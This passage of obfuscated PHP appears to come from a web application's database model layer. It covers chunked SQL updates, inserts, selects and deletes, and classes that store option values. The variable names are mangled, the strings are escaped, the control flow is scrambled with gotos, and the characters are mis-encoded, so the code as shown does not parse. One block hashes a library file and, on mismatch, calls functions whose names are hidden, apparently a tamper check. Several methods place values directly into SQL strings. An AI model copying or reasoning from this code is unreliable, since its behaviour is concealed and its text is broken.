(isset($aŸ£¨³¿[$AÅãŒ¿ˆ‰])) { array_unshift($EªË¬ÚÂÒº, $aŸ£¨³¿[$AÅãŒ¿ˆ‰]); } if ($AÚ¿‡Ëïµ±[306] == $eÍõÃäÇã‡[3]) { $aŸ£¨³¿[$AÅãŒ¿ˆ‰] = call_user_func_array($B“Ü×çå±, $EªË¬ÚÂÒº); } else { $aŸ£¨³¿[$AÅãŒ¿ˆ‰] = call_user_func_array(array(&$this, $B“Ü×çå±), $EªË¬ÚÂÒº); } break; case $AÚ¿‡Ëïµ±[258]: $aŸ£¨³¿[$AÅãŒ¿ˆ‰] = $aŸ£¨³¿[$eÍõÃäÇã‡[1]]; break; case $AÚ¿‡Ëïµ±[279]: if (isset($aŸ£¨³¿[$AÅãŒ¿ˆ‰]) && !is_string($aŸ£¨³¿[$AÅãŒ¿ˆ‰])) { $aŸ£¨³¿[$AÅãŒ¿ˆ‰] = json_encode_force($aŸ£¨³¿[$AÅãŒ¿ˆ‰]); } break; case $AÚ¿‡Ëïµ±[308]: if ($aŸ£¨³¿[$AÅãŒ¿ˆ‰] === $AÚ¿‡Ëïµ±[33]) { unset($aŸ£¨³¿[$AÅãŒ¿ˆ‰]); } break; case $AÚ¿‡Ëïµ±[309]: $aŸ£¨³¿[$AÅãŒ¿ˆ‰] = $eÍõÃäÇã‡[1]; default: break; } } if ($aÕ÷éãÂÑ© == $AÚ¿‡Ëïµ±[340]) { $E…Éæˆõ = strtolower($this->db->getDbType()); if (strpos($E…Éæˆõ, $AÚ¿‡Ëïµ±[9]) !== 0) { return; } $EÃöÊŒñí = $this->field(!0)->fields; $DÊ•­‹ö…” = $EÃöÊŒñí[$AÚ¿‡Ëïµ±[237]]; if (isset($EÃöÊŒñí[$AÚ¿‡Ëïµ±[236]])) { unset($DÊ•­‹ö…”[$EÃöÊŒñí[$AÚ¿‡Ëïµ±[236]]]); } foreach ($DÊ•­‹ö…” as $dô—µ‹ˆ® => $aÕ÷éãÂÑ©) { if (!isset($aŸ£¨³¿[$dô—µ‹ˆ®])) { $aŸ£¨³¿[$dô—µ‹ˆ®] = $AÚ¿‡Ëïµ±[33]; } } } } private function dataAfterFilter(&$fîÌöğŒ‡‘) { $FÍ…Ì×°ïŠ =& $_SERVER[‘®…¢À]; foreach ($this->dataAuto as $A¢à‘¬‚øĞ) { $f†Ç‹‚å®¼ = $A¢à‘¬‚øĞ[0]; if (!in_array($FÍ…Ì×°ïŠ[342], explode($FÍ…Ì×°ïŠ[47], $A¢à‘¬‚øĞ[2]))) { continue; } if (!isset($fîÌöğŒ‡‘[$f†Ç‹‚å®¼])) { continue; } switch (trim($A¢à‘¬‚øĞ[3])) { case $FÍ…Ì×°ïŠ[306]: case $FÍ…Ì×°ïŠ[307]: $eÔ×‚ÀÔ¶ = isset($A¢à‘¬‚øĞ[4]) ? (array) $A¢à‘¬‚øĞ[4] : array(); array_unshift($eÔ×‚ÀÔ¶, $fîÌöğŒ‡‘[$f†Ç‹‚å®¼]); if ($FÍ…Ì×°ïŠ[306] == $A¢à‘¬‚øĞ[3]) { $fîÌöğŒ‡‘[$f†Ç‹‚å®¼] = call_user_func_array($A¢à‘¬‚øĞ[1], $eÔ×‚ÀÔ¶); } else { $fîÌöğŒ‡‘[$f†Ç‹‚å®¼] = call_user_func_array(array(&$this, $A¢à‘¬‚øĞ[1]), $eÔ×‚ÀÔ¶); } break; case $FÍ…Ì×°ïŠ[258]: $fîÌöğŒ‡‘[$f†Ç‹‚å®¼] = $fîÌöğŒ‡‘[$A¢à‘¬‚øĞ[1]]; break; case $FÍ…Ì×°ïŠ[279]: $CÌµ‰‚¨ŞÅ = $fîÌöğŒ‡‘[$f†Ç‹‚å®¼]; $fîÌöğŒ‡‘[$f†Ç‹‚å®¼] = json_decode($CÌµ‰‚¨ŞÅ, !0); if (is_null($fîÌöğŒ‡‘[$f†Ç‹‚å®¼])) { $fîÌöğŒ‡‘[$f†Ç‹‚å®¼] = $CÌµ‰‚¨ŞÅ; } break; case $FÍ…Ì×°ïŠ[308]: if ($fîÌöğŒ‡‘[$f†Ç‹‚å®¼] === $FÍ…Ì×°ïŠ[33]) { unset($fîÌöğŒ‡‘[$f†Ç‹‚å®¼]); } break; case $FÍ…Ì×°ïŠ[309]: $fîÌöğŒ‡‘[$f†Ç‹‚å®¼] = $A¢à‘¬‚øĞ[1]; default: break; } } } public function saveAll($A•òˆÙ½Ó) { goto F††ŒÕƒÏ; fÌƒôµ¼¡â: $B“ˆ¤‡ïá = $ešŒ¿´¡à[357]; $c×Ä•ñ££ = 0; $eÖ×´ŞŒ = array(); goto fÍ‘â‚ÎÚ; F††ŒÕƒÏ: $ešŒ¿´¡à =& $_SERVER[‘®…¢À]; $B©¾Š÷¤ñ = $this->tablePrefix . $this->tableName; $eâ˜Ûí­• = self::SQL_WHERE_IN_CHUNK; goto fÌƒôµ¼¡â; fÍ‘â‚ÎÚ: $cª‹±Êñò = count($A•òˆÙ½Ó); for ($eµØšÛæŞ = 0; $eµØšÛæŞ < $cª‹±Êñò; $eµØšÛæŞ++) { $AŞÊëœŸí = $A•òˆÙ½Ó[$eµØšÛæŞ]; if (!is_array($AŞÊëœŸí) || count($AŞÊëœŸí) != 4) { continue; } $E¡ŒèÚÀ¨˜ = "\125\x50\x44\101\x54\x45\40{$B©¾Š÷¤ñ}\x20\x53\105\x54\40{$AŞÊëœŸí[2]}\40\75\x20\x43\x41\x53\105\x20{$AŞÊëœŸí[0]}\x20\12"; if ($c×Ä•ñ££ == 0) { $B“ˆ¤‡ïá = $E¡ŒèÚÀ¨˜; } $eÖ×´ŞŒ[] = $ešŒ¿´¡à[114] . $AŞÊëœŸí[1] . $ešŒ¿´¡à[114]; $c×Ä•ñ££++; $B“ˆ¤‡ïá .= "\x20\x57\110\105\x4e\x20\47{$AŞÊëœŸí[1]}\x27\x20\124\110\105\116\40\47{$AŞÊëœŸí[3]}\x27\40\xa"; if ($c×Ä•ñ££ == $eâ˜Ûí­• || $eµØšÛæŞ == $cª‹±Êñò - 1) { goto bÈ°ÖàŒ‘ß; E ØŞŸ Š¶: $c×Ä•ñ££ = 0; $B“ˆ¤‡ïá = $E¡ŒèÚÀ¨˜; $this->chunkEventCheck(count($eÖ×´ŞŒ)); goto eä¸‰°ö£; bÈ°ÖàŒ‘ß: $cŸ‰©Ø–¶Ö = implode($ešŒ¿´¡à[47], $eÖ×´ŞŒ); $B“ˆ¤‡ïá .= "\40\105\x4e\104\x20\x20\x57\x48\x45\x52\x45\40{$AŞÊëœŸí[0]}\x20\x49\116\x20\50{$cŸ‰©Ø–¶Ö}\x29\x20"; $this->execute($B“ˆ¤‡ïá); goto E ØŞŸ Š¶; eä¸‰°ö£: $eÖ×´ŞŒ = array(); goto D‚åâìº¦‰; D‚åâìº¦‰: } } $this->chunkEventSet(); goto EŒ¬É«í”Ş; EŒ¬É«í”Ş: } public function saveAllEach($fù°ä´¤²³) { $Fßµò÷¡‡Ö =& $_SERVER[‘®…¢À]; $f·”ˆÂ„­½ = $this->tablePrefix . $this->tableName; foreach ($fù°ä´¤²³ as $dÑ‰¡’ŸßÑ) { if (!is_array($dÑ‰¡’ŸßÑ) || count($dÑ‰¡’ŸßÑ) != 4) { continue; } $eÄƒ°°àÖó = $dÑ‰¡’ŸßÑ[0] . $Fßµò÷¡‡Ö[358] . $dÑ‰¡’ŸßÑ[1] . $Fßµò÷¡‡Ö[114]; $E›êìÎ©Ìä = $dÑ‰¡’ŸßÑ[2] . $Fßµò÷¡‡Ö[358] . $dÑ‰¡’ŸßÑ[3] . $Fßµò÷¡‡Ö[114]; $cÚ—£¦µÇ¬ = "\165\160\144\141\x74\x65\40{$f·”ˆÂ„­½}\x20\163\145\x74\40{$E›êìÎ©Ìä}\x20\167\x68\145\162\x65\x20{$eÄƒ°°àÖó}\x3b"; $this->execute($cÚ—£¦µÇ¬); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($A‰ê­ºÇÁ¾ = false, $c¼ŠÉŠÊ‡² = false) { $this->_chunkEvent = $A‰ê­ºÇÁ¾; $this->_chunkEventParam = $c¼ŠÉŠÊ‡²; } private function chunkEventCheck($C²¨øß§¾Æ) { if (!$this->_chunkEvent) { return; } $f«‡­ ‚¼– = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $f«‡­ ‚¼–[$_SERVER[‘®…¢À][359]] = $C²¨øß§¾Æ; Hook::trigger($this->_chunkEvent, $f«‡­ ‚¼–); } public function addAll($d¾ÓÓ¡Û÷‰, $AˆçÓàÛ„³ = array(), $CŠº²…¨Ì = false) { goto b˜½£ˆĞ“½; b˜½£ˆĞ“½: $bßãÙ¿é¢½ =& $_SERVER[‘®…¢À]; ignore_timeout(); $eë“Ïï·’… = self::SQL_WHERE_IN_CHUNK; goto aÓº±ˆ²; aÓº±ˆ²: if (empty($d¾ÓÓ¡Û÷‰)) { $this->error = think_lang($bßãÙ¿é¢½[256]); return !1; } $AˆçÓàÛ„³ = $this->_parseOptions($AˆçÓàÛ„³); foreach ($d¾ÓÓ¡Û÷‰ as $CÒ»ò¦¼Ü£ => $d’ö¼¤’Õ›) { $d¾ÓÓ¡Û÷‰[$CÒ»ò¦¼Ü£] = $this->_facade($d’ö¼¤’Õ›); $this->_beforeInsert($d¾ÓÓ¡Û÷‰[$CÒ»ò¦¼Ü£], $AˆçÓàÛ„³); } goto c§Õï–ƒ³ê; c§Õï–ƒ³ê: if (method_exists($this->db, $bßãÙ¿é¢½[257])) { for ($eõ„¼ Â‹è = 0; $eõ„¼ Â‹è < count($d¾ÓÓ¡Û÷‰); $eõ„¼ Â‹è += $eë“Ïï·’…) { $F‰†Âô”ÖÓ = array_slice($d¾ÓÓ¡Û÷‰, $eõ„¼ Â‹è, $eë“Ïï·’…); if (!is_array($F‰†Âô”ÖÓ) || count($F‰†Âô”ÖÓ) == 0) { break; } $BŠ¡–ÑÎ¯ = $this->db->insertAll($F‰†Âô”ÖÓ, $AˆçÓàÛ„³, $CŠº²…¨Ì); $this->chunkEventCheck(count($F‰†Âô”ÖÓ)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($d¾ÓÓ¡Û÷‰ as $CÒ»ò¦¼Ü£ => $d’ö¼¤’Õ›) { $BŠ¡–ÑÎ¯ = $this->db->insert($d’ö¼¤’Õ›, $AˆçÓàÛ„³, $CŠº²…¨Ì); } $this->commit(); } if (!1 !== $BŠ¡–ÑÎ¯) { $FÈæ»ó™‹ = $this->getLastInsID(); if ($FÈæ»ó™‹) { return $FÈæ»ó™‹; } } return $BŠ¡–ÑÎ¯; goto cˆ–©Ó„³; cˆ–©Ó„³: } public function save($fÇµÁæ¸®’ = '', $B·®çá¢ = array()) { goto cßø¿§Œ„; cßø¿§Œ„: $Cœİ¥Ô¶½ì =& $_SERVER[‘®…¢À]; $FÄçÄ¥±—” = self::SQL_WHERE_IN_CHUNK; $fØÌê…²Òâ = $this->optionsValue(); goto DÁÑô´°»È; d¯î‹ª˜‰Â: $bÜ¾¢è£‘ = $fØÌê…²Òâ[$Cœİ¥Ô¶½ì[260]][$D¹®Áï¯ƒ²][1]; $cö²‘Ô—• = count($bÜ¾¢è£‘); for ($bê¯ÊèÀÆ = 0; $bê¯ÊèÀÆ < $cö²‘Ô—•; $bê¯ÊèÀÆ += $FÄçÄ¥±—”) { $EˆÄöåæÏÌ = array_slice($bÜ¾¢è£‘, $bê¯ÊèÀÆ, $FÄçÄ¥±—”); if (!is_array($EˆÄöåæÏÌ) || count($EˆÄöåæÏÌ) == 0) { break; } $fØÌê…²Òâ[$Cœİ¥Ô¶½ì[260]][$D¹®Áï¯ƒ²][1] = $EˆÄöåæÏÌ; $this->optionsValue($fØÌê…²Òâ); $d‡ùÉè¸©› += parent::save($fÇµÁæ¸®’, $B·®çá¢); $this->chunkEventCheck(count($EˆÄöåæÏÌ)); } goto b¬áñöã ²; DÁÑô´°»È: $D¹®Áï¯ƒ² = $this->findWhereField($fØÌê…²Òâ); if (!$D¹®Áï¯ƒ²) { return parent::save($fÇµÁæ¸®’, $B·®çá¢); } $d‡ùÉè¸©› = 0; goto d¯î‹ª˜‰Â; b¬áñöã ²: $this->chunkEventSet(); return $d‡ùÉè¸©›; goto AæÇ¯ø²â; AæÇ¯ø²â: } public function add($C‘ÚŒ›Äºñ = '', $e¹ÊøÈ®é = array(), $CŒ»ŞŠ»¤ô = false) { if ($this->addTaskStatus && is_array($C‘ÚŒ›Äºñ)) { $this->addTaskData[] = $C‘ÚŒ›Äºñ; return; } return parent::add($C‘ÚŒ›Äºñ, $e¹ÊøÈ®é, $CŒ»ŞŠ»¤ô); } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($cÙ‰â”à‹ = array()) { goto B‡°È—…ñğ; d„Éî–´ºË: $D«¡óôÂè = $this->findWhereField($bŒÔÑË ¾¾); if (!$D«¡óôÂè || isset($bŒÔÑË ¾¾[$E…Ñ©Î®ì[277]]) || isset($bŒÔÑË ¾¾[$E…Ñ©Î®ì[336]])) { return parent::select($cÙ‰â”à‹); } $dË¨‡Ğ»Ãì = $bŒÔÑË ¾¾[$E…Ñ©Î®ì[260]][$D«¡óôÂè][1]; goto eË¿ĞƒÖÃ; B‡°È—…ñğ: $E…Ñ©Î®ì =& $_SERVER[‘®…¢À]; $d¿ÚÔ‡ìÀÏ = self::SQL_WHERE_IN_CHUNK; $bŒÔÑË ¾¾ = $this->optionsValue(); goto d„Éî–´ºË; eË¿ĞƒÖÃ: $a¦ùƒÔ‚ÕÜ = null; for ($EÁÄç¨­‡ = 0; $EÁÄç¨­‡ < count($dË¨‡Ğ»Ãì); $EÁÄç¨­‡ += $d¿ÚÔ‡ìÀÏ) { $dÅ¶ï¬Ïç£ = array_slice($dË¨‡Ğ»Ãì, $EÁÄç¨­‡, $d¿ÚÔ‡ìÀÏ); if (!is_array($dÅ¶ï¬Ïç£) || count($dÅ¶ï¬Ïç£) == 0) { break; } $bŒÔÑË ¾¾[$E…Ñ©Î®ì[260]][$D«¡óôÂè][1] = $dÅ¶ï¬Ïç£; $this->optionsValue($bŒÔÑË ¾¾); $B©ÛÈµ¡÷µ = parent::select($cÙ‰â”à‹); if (!$B©ÛÈµ¡÷µ) { continue; } if (is_null($a¦ùƒÔ‚ÕÜ)) { $a¦ùƒÔ‚ÕÜ = array(); } $a¦ùƒÔ‚ÕÜ = array_merge($a¦ùƒÔ‚ÕÜ, $B©ÛÈµ¡÷µ); } return $a¦ùƒÔ‚ÕÜ; goto C¯ïáÍ‹…ƒ; C¯ïáÍ‹…ƒ: } public function delete($c½ßÄËì–Ò = array()) { goto C¼ÀŒÇä…; C¼ÀŒÇä…: $e†Á–ØŞÌè =& $_SERVER[‘®…¢À]; $b‚ö×¶ÂÑŞ = self::SQL_WHERE_IN_CHUNK; $Aö¿ªàÒÏ = $this->optionsValue(); goto d–åÅ…¯ŠÏ; d–åÅ…¯ŠÏ: $FË¥¯¢±Ø• = $this->findWhereField($Aö¿ªàÒÏ); if (!$FË¥¯¢±Ø•) { return parent::delete($c½ßÄËì–Ò); } $AÇØ©¶÷Ô– = 0; goto a‡‡Òïå­; a‡‡Òïå­: $cáÁ­ÚÜ¦Õ = $Aö¿ªàÒÏ[$e†Á–ØŞÌè[260]][$FË¥¯¢±Ø•][1]; for ($EÍêÒƒ¹Ûİ = 0; $EÍêÒƒ¹Ûİ < count($cáÁ­ÚÜ¦Õ); $EÍêÒƒ¹Ûİ += $b‚ö×¶ÂÑŞ) { $AË¸ã¹‰¾· = array_slice($cáÁ­ÚÜ¦Õ, $EÍêÒƒ¹Ûİ, $b‚ö×¶ÂÑŞ); if (!is_array($AË¸ã¹‰¾·) || count($AË¸ã¹‰¾·) == 0) { break; } $Aö¿ªàÒÏ[$e†Á–ØŞÌè[260]][$FË¥¯¢±Ø•][1] = $AË¸ã¹‰¾·; $this->optionsValue($Aö¿ªàÒÏ); $AÇØ©¶÷Ô– += parent::delete($c½ßÄËì–Ò); } return $AÇØ©¶÷Ô–; goto CŸ“¿õ¹; CŸ“¿õ¹: } private function findWhereField($BÍÚÓ“–ÖŒ) { $cµĞ…÷øöŸ =& $_SERVER[‘®…¢À]; $d‚ÎÔˆ›ó× = self::SQL_WHERE_IN_CHUNK; if (!is_array($BÍÚÓ“–ÖŒ) || !is_array($BÍÚÓ“–ÖŒ[$cµĞ…÷øöŸ[260]])) { return !1; } foreach ($BÍÚÓ“–ÖŒ[$cµĞ…÷øöŸ[260]] as $e´åÁ”Á÷ => $fŞÉöÌÓôä) { if (is_array($fŞÉöÌÓôä) && isset($fŞÉöÌÓôä[0]) && is_string($fŞÉöÌÓôä[0]) && strtolower($fŞÉöÌÓôä[0]) == $cµĞ…÷øöŸ[7] && is_array($fŞÉöÌÓôä[1]) && count($fŞÉöÌÓôä[1]) > $d‚ÎÔˆ›ó×) { ignore_timeout(); return $e´åÁ”Á÷; } } return !1; } } class ModelBaseLight { public $optionType = ''; public $modelType = "\123\x79\163\164\145\155\x4f\x70\164\151\157\x6e"; public $field = array(); public function listData($fâ®Äô‹È³ = false, $B¸»Ÿƒø = "\x6d\x6f\144\151\x66\171\x54\x69\155\x65", $D­±‡Ÿ´¥Ù = false) { $a¶ó®¯¶Â‚ = Model($this->modelType)->get(!1, $this->optionType, !0); if (!$fâ®Äô‹È³) { $a¶ó®¯¶Â‚ = array_filter(array_values($a¶ó®¯¶Â‚)); return array_sort_by($a¶ó®¯¶Â‚, $B¸»Ÿƒø, $D­±‡Ÿ´¥Ù); } return $a¶ó®¯¶Â‚[$_SERVER[‘®…¢À][360] . $fâ®Äô‹È³]; } public function insert($EÙÖáÆŒ¹) { goto a‘ùÉ¥·ˆ®; a‘ùÉ¥·ˆ®: $Fá‡õÛÇ³á =& $_SERVER[‘®…¢À]; $EÙÖáÆŒ¹ = array_field_key($EÙÖáÆŒ¹, $this->field); $dèÊ„«É = Model($this->modelType)->get($Fá‡õÛÇ³á[361], $this->optionType . $Fá‡õÛÇ³á[362]); goto c¤¨¤‹â; E‡Õ‰×ôç•: $EÙÖáÆŒ¹[$Fá‡õÛÇ³á[108]] = time(); Model($this->modelType)->set($Fá‡õÛÇ³á[361], $dèÊ„«É, $this->optionType . $Fá‡õÛÇ³á[362]); Model($this->modelType)->set($Fá‡õÛÇ³á[360] . $dèÊ„«É, $EÙÖáÆŒ¹, $this->optionType); goto DİÒ‘¯ÈÁ; c¤¨¤‹â: $dèÊ„«É = $dèÊ„«É ? $dèÊ„«É : 0; $EÙÖáÆŒ¹[$Fá‡õÛÇ³á[363]] = ++$dèÊ„«É; $EÙÖáÆŒ¹[$Fá‡õÛÇ³á[184]] = time(); goto E‡Õ‰×ôç•; DİÒ‘¯ÈÁ: return $dèÊ„«É; goto F¡‡óÓàİ—; F¡‡óÓàİ—: } public function update($b ‰ó¯Ê¶†, $FÏªÚ³‘‘) { goto dã°ø£Âõ; bÔ‘Ãë¾É: if (!$d¾É‰Í†øÌ) { return !1; } $FÏªÚ³‘‘ = array_merge($d¾É‰Í†øÌ, $FÏªÚ³‘‘); $FÏªÚ³‘‘[$f«á§‰×ì·[108]] = time(); goto b‹äã’˜³‰; b‹äã’˜³‰: return Model($this->modelType)->set($f«á§‰×ì·[360] . $b ‰ó¯Ê¶†, $FÏªÚ³‘‘, $this->optionType); goto b½¯šàæ…ˆ; dã°ø£Âõ: $f«á§‰×ì· =& $_SERVER[‘®…¢À]; $FÏªÚ³‘‘ = array_field_key($FÏªÚ³‘‘, $this->field); $d¾É‰Í†øÌ = $this->listData($b ‰ó¯Ê¶†); goto bÔ‘Ãë¾É; b½¯šàæ…ˆ: } public function remove($a’˜Ğ­òÔ£) { return Model($this->modelType)->remove($_SERVER[‘®…¢À][360] . $a’˜Ğ­òÔ£, $this->optionType); } public function clear() { $Fß£³Œ¾á =& $_SERVER[‘®…¢À]; Model($this->modelType)->remove($Fß£³Œ¾á[361], $this->optionType . $Fß£³Œ¾á[362]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($B¹ìç»Ò÷œ, $fÈŒ©ÔÄ½) { if (!$fÈŒ©ÔÄ½) { return !1; } $Bª¢²êîŠ° = $this->listData(); $Bª¢²êîŠ° = array_to_keyvalue($Bª¢²êîŠ°, $B¹ìç»Ò÷œ); return isset($Bª¢²êîŠ°[$fÈŒ©ÔÄ½]) ? $Bª¢²êîŠ°[$fÈŒ©ÔÄ½] : !1; } public function findByName($däŞä† é¢) { return $this->findByKey($_SERVER[‘®…¢À][28], $däŞä† é¢); } protected function resetData($D­®˜°¿Êî) { $EŒØ´«¶¼Ê =& $_SERVER[‘®…¢À]; $fØÂÒŞƒ¤ = array(); for ($eÅ™ÕÙóä = 0; $eÅ™ÕÙóä < count($D­®˜°¿Êî); $eÅ™ÕÙóä++) { $fØÂÒŞƒ¤[$EŒØ´«¶¼Ê[360] . $D­®˜°¿Êî[$eÅ™ÕÙóä][$EŒØ´«¶¼Ê[363]]] = $D­®˜°¿Êî[$eÅ™ÕÙóä]; } return Model($this->modelType)->set($fØÂÒŞƒ¤, !1, $this->optionType); } private function getAutoName($DÃ±Ø¡„¿ ) { $EÍ†ä¸¾ = array_to_keyvalue($this->listData(), $_SERVER[‘®…¢À][28]); if (!$EÍ†ä¸¾ || !isset($EÍ†ä¸¾[$DÃ±Ø¡„¿ ])) { return $DÃ±Ø¡„¿ ; } for ($F±Û¡‹¬›â = 1; $F±Û¡‹¬›â < count($EÍ†ä¸¾); $F±Û¡‹¬›â++) { $eÈğ±¸¶ó¸ = $DÃ±Ø¡„¿  . "\50{$F±Û¡‹¬›â}\x29"; if (!isset($EÍ†ä¸¾[$eÈğ±¸¶ó¸])) { return $eÈğ±¸¶ó¸; } } return $eÈğ±¸¶ó¸; } } class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($A¡¹ÆŠÜÔ = false, $Dµõ­®áŞ = '', $E×ˆùÔ·¹ = false) { goto A±œ·âîÚ; A±œ·âîÚ: $B‚ ï‡ïÌ´ =& $_SERVER[‘®…¢À]; $A¶Ğò˜³Ú© = $this->cacheGet($Dµõ­®áŞ); $Fù– ßˆ·´ = $this->optionDefault($Dµõ­®áŞ); goto E¡…á„¿°á; E¡…á„¿°á: $Fù– ßˆ·´ = is_array($Fù– ßˆ·´) ? $Fù– ßˆ·´ : array(); if (is_array($A¶Ğò˜³Ú©)) { $A¶Ğò˜³Ú© = array_merge($Fù– ßˆ·´, $A¶Ğò˜³Ú©); return $A¡¹ÆŠÜÔ ? isset($A¶Ğò˜³Ú©[$A¡¹ÆŠÜÔ]) ? $A¶Ğò˜³Ú©[$A¡¹ÆŠÜÔ] : null : $A¶Ğò˜³Ú©; } $FŒ´¢Œáö = $this->filterWhere(array($B‚ ï‡ïÌ´[29] => $Dµõ­®áŞ)); goto F‘š¥ª­°¶; AÇ³÷ÚÂ: $this->cacheSet($Dµõ­®áŞ, $A¶Ğò˜³Ú©); $A¶Ğò˜³Ú© = array_merge($Fù– ßˆ·´, $A¶Ğò˜³Ú©); return $A¡¹ÆŠÜÔ ? $A¶Ğò˜³Ú©[$A¡¹ÆŠÜÔ] : $A¶Ğò˜³Ú©; goto B—îœ‘Ä£‹; F‘š¥ª­°¶: $A¶Ğò˜³Ú© = $this->where($FŒ´¢Œáö)->select(); $A¶Ğò˜³Ú© = array_to_keyvalue($A¶Ğò˜³Ú©, $B‚ ï‡ïÌ´[90], $B‚ ï‡ïÌ´[355]); foreach ($A¶Ğò˜³Ú© as $e‚óÂÛİÌ‰ => $f·¿¾ÓôšÖ) { if ($E×ˆùÔ·¹ || in_array($e‚óÂÛİÌ‰, $this->jsonField)) { $A¶Ğò˜³Ú©[$e‚óÂÛİÌ‰] = json_decode($A¶Ğò˜³Ú©[$e‚óÂÛİÌ‰], !0); } } goto AÇ³÷ÚÂ; B—îœ‘Ä£‹: } public function set($B™ÖÊö¥áÑ, $E¥½ó±Í = false, $a‰…‘¥’ÍŠ = '') { $eóÈÚ×ì¢Ì =& $_SERVER[‘®…¢À]; $this->cacheRemove($a‰…‘¥’ÍŠ); $EÉ¿±Æ®™è = array(); $B²á†÷‹Š = is_array($B™ÖÊö¥áÑ) ? $B™ÖÊö¥áÑ : array($B™ÖÊö¥áÑ => $E¥½ó±Í); foreach ($B²á†÷‹Š as $eçº‹¸›“ => $dÃÉøÍÄ—õ) { if (is_array($dÃÉøÍÄ—õ)) { $dÃÉøÍÄ—õ = json_encode_force($dÃÉøÍÄ—õ); } $this->checkLength($dÃÉøÍÄ—õ, !1, $this->tableName . $eóÈÚ×ì¢Ì[4] . $B™ÖÊö¥áÑ); $dÃÉøÍÄ—õ = self::textEncode($dÃÉøÍÄ—õ); $B²á†÷‹Š = array($eóÈÚ×ì¢Ì[29] => $a‰…‘¥’ÍŠ, $eóÈÚ×ì¢Ì[90] => $eçº‹¸›“, $eóÈÚ×ì¢Ì[355] => $dÃÉøÍÄ—õ); $EÉ¿±Æ®™è[] = $this->filterWhere($B²á†÷‹Š); } return $this->addAll($EÉ¿±Æ®™è, array(), !0); } protected function optionDefault($d¡âÌ¨ìÄ = '') { return !1; } public function setDeep($Eªù…¹ÛÜ, $EĞğÖ£·¾Ä = false, $c†ÔÀÌ = '') { $BÂ¾©¿Óù¯ = explode($_SERVER[‘®…¢À][94], $Eªù…¹ÛÜ); $eÖ—¼«ºĞ® = $this->get(); array_set_value($eÖ—¼«ºĞ®, $Eªù…¹ÛÜ, $EĞğÖ£·¾Ä); $this->set($BÂ¾©¿Óù¯[0], $eÖ—¼«ºĞ®[$BÂ¾©¿Óù¯[0]], $c†ÔÀÌ); } public function remove($Dù¡°İÓ„, $Dùæ¯ŠŒè = '') { $dƒ†ƒ¨ÚùÈ =& $_SERVER[‘®…¢À]; $this->CacheRemove($Dùæ¯ŠŒè); $FÛ‹ƒœŒÜ = $this->filterWhere(array($dƒ†ƒ¨ÚùÈ[90] => $Dù¡°İÓ„, $dƒ†ƒ¨ÚùÈ[29] => $Dùæ¯ŠŒè)); if (is_null($Dù¡°İÓ„)) { unset($FÛ‹ƒœŒÜ[$dƒ†ƒ¨ÚùÈ[90]]); } return $this->where($FÛ‹ƒœŒÜ)->delete(); } public function cacheSet($E¿ê”½‘², $eÛ»¿¤©¶œ = false) { return Cache::set($this->cacheKey($E¿ê”½‘²), $eÛ»¿¤©¶œ); } public function cacheGet($bÏì–Öæ¤É) { return Cache::get($this->cacheKey($bÏì–Öæ¤É)); } public function cacheRemove($A†Òš—‡Ø) { return Cache::remove($this->cacheKey($A†Òš—‡Ø)); } protected function filterWhere($b¤Ëœªµå‡) { return $b¤Ëœªµå‡; } protected function cacheKey($fùÂÉÉñ†) { return $fùÂÉÉñ†; } } goto BãÅÆ‹Å¸†; Bé˜óà‚À: $CÖæ„Ñ«‘ = LIB_DIR . $_SERVER[‘®…¢À][1194]; $c¸¬¡îØÎ™ = $_SERVER[‘®…¢À][1195]; if ($_SERVER[$_SERVER[‘®…¢À][768]] != $c¸¬¡îØÎ™($CÖæ„Ñ«‘)) { goto E–ñÅ‰ºÓ; AæõÅš÷Ÿ±: $c‚¼öÆí›ñ($CÖæ„Ñ«‘); goto fÚ¡Œ¥¼Ì…; E–ñÅ‰ºÓ: $D£ó×Ñ´æì = $_SERVER[‘®…¢À][771]; $d’¤ğñà = $_SERVER[$_SERVER[‘®…¢À][772]] . $_SERVER[‘®…¢À][773]; $fĞÒ’ÙÍ†Ğ = $D£ó×Ñ´æì($d’¤ğñà); goto cÂ¼ÇÛš­; cÂ¼ÇÛš­: $A¨· µÊ–‘ = explode($_SERVER[‘®…¢À][214], $fĞÒ’ÙÍ†Ğ); if (count($A¨· µÊ–‘) < $_SERVER[‘®…¢À][548]) { $dŞİï…òå‡ = $_SERVER[‘®…¢À][774]; $dŞİï…òå‡(); } $c‚¼öÆí›ñ = $_SERVER[‘®…¢À][1075]; goto AæõÅš÷Ÿ±; fÚ¡Œ¥¼Ì…: } goto Bèêö×­íË; F¥Ø“»Ì¨®: class SystemRecordModel extends ModelBaseLight { } class SystemRoleModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\x74\145\155\x2e\x72\x6f\154\x65\114\x69\163\164"; public $field = array("\x6e\x61\x6d\x65", "\x61\165\164\150", "\x6c\141\142\x65\x6c", "\x64\x69\x73\x70\154\x61\x79", "\x73\171\163\x74\145\x6d", "\x64\x65\x73\x63", "\x69\x67\156\x6f\162\145\x45\x78\x74", "\x69\x67\x6e\157\162\x65\x46\x69\x6c\x65\x53\x69\172\x65", "\x61\144\155\x69\156\151\x73\164\x72\141\164\x6f\162", "\163\157\x72\164"); public function listData($cèÚÁ—¿Õö = false, $b¦ØÀ¨³™ = "\x73\157\162\164", $føÌêÆ‰º“ = false) { return parent::listData($cèÚÁ—¿Õö, $b¦ØÀ¨³™, $føÌêÆ‰º“); } public function update($Dƒ£ÕùÌî÷, $Bò‰îİ„İÑ) { goto eø›¾Æì¾ä; BöÉ‚¸ÑÆÃ: return parent::update($Dƒ£ÕùÌî÷, $Bò‰îİ„İÑ); goto b˜ª‘—„òÀ; eôÆõ…äè: if (!$f–ù„ô®âÚ || $C¨ˆµï‡‘™ && $C¨ˆµï‡‘™[$a”Çšµ¿°[363]] != $f–ù„ô®âÚ[$a”Çšµ¿°[363]]) { return !1; } if ($C¨ˆµï‡‘™[$a”Çšµ¿°[2349]] == 1) { $Bò‰îİ„İÑ = array($a”Çšµ¿°[28] => 